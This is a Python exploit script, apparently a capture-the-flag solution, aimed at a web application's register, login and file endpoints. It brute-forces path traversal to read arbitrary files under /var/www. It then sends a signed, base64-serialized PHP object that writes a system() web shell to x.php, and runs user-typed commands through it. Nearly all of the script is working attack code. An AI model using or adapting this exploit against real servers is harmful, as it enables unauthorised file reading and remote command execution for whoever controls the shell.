import requests
import json
#get_command = input("Enter command: ")
proxies = {
    "http": '127.0.0.1:8080',
    "https": '127.0.0.1:8080',
}
url = 'put_url_here/'
username = 'admin'
password = 'password'


def register():
    header = {'Content-Type': 'application/json'}
    data = {"username": username, "password": password}
    req = requests.post(url + 'register', headers=header, json=data)
    return req.text


def login():
    header = {'Content-Type': 'application/json'}
    data = {"username": username, "password": password}
    req = requests.post(url + 'login', headers=header, json=data)
    return req.text


def retrive_file():
    header = {'Content-Type': 'application/json'}
    token = login()
    token['uuid'] = '572c2e2c-db04-439e-8156-c9700a9c94d5'
    token['gid'] = '0'
    req = requests.post(url + 'file', headers=header, data=token)
    return req.text


register()


def read_file():
    get_read_file = input("Enter file name: ")
    headers = {
        "User-Agent": "curl/7.74.0",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Connection": "close"
    }
    uuid = ''
    while True:
        token = login().strip('}').strip('{').split(':')[1].strip("\"")
        print(token, type(token))
        uuid += '../'
        json = {
            "sig": 0,
            "token": str(token),
            "uuid": "../../../" + uuid + f"var/www/{get_read_file}",
        }
        req = requests.post(url + 'file',
                            headers=headers,
                            json=json,
                            proxies=proxies,
                            verify=False)
        if 'false' in req.text:
            print('there is no file with this name')
            break
        if 'Invalid Signature' in req.text:
            continue
        else:
            return req.text


def run_command():

    headers = {
        "User-Agent": "curl/7.74.0",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Connection": "close"
    }
    json = {
        "password": password,
        "token":
        "Tzo0OiJGaWxlIjozOntzOjU6Im93bmVyIjtOO3M6NDoidXVpZCI7czoyNzoiPD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOz8%2BIjtzOjc6ImxvZ2ZpbGUiO3M6MTQ6Ii92YXIvd3d3L3gucGhwIjt9--8454de964f9bc581413cdf6cc3e22e31",
        "username": username
    }
    requests.post(url + 'register',
                  headers=headers,
                  json=json,
                  proxies=proxies,
                  verify=False)
    run_command = input("Enter command: ")
    req = requests.get(url + 'x.php?c=' + run_command,
                       proxies=proxies,
                       verify=False)
    return req.text


print(read_file())
print('-----------------------------------------------------')
print(run_command())
